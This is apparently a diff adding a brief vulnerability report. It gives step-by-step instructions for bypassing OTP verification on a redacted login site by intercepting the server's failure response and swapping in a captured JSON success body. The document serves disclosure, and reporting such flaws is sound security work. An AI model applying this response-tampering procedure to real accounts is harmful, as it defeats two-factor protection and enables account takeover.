@@ -1,0 +1,19 @@
+1-log to to https://pro.xxxxx.com/Custumers/login
+2-after entering your email and password , you ll receive a verification email with 6 digit OTP
+3-enter OTP code and intercept request, then save the reponse of this request:
+			{"code" : "correct"};
+			{"status":"success"};
+			{"action":"login"}
+4-logout and try to login again with other account
+5-in OTP verification, enter a non valid OTP code and intercept respond
+6-change body of the response from :
+				{"code" : "false"};
+				{"status":"failed"};
+				{"action":"redirect"}
+to 
+				{"code" : "correct"};
+				{"status":"success"};
+				{"action":"login"}
+then click send.
+7-go back to your browser you ll see that now you logged in without otp verification
+
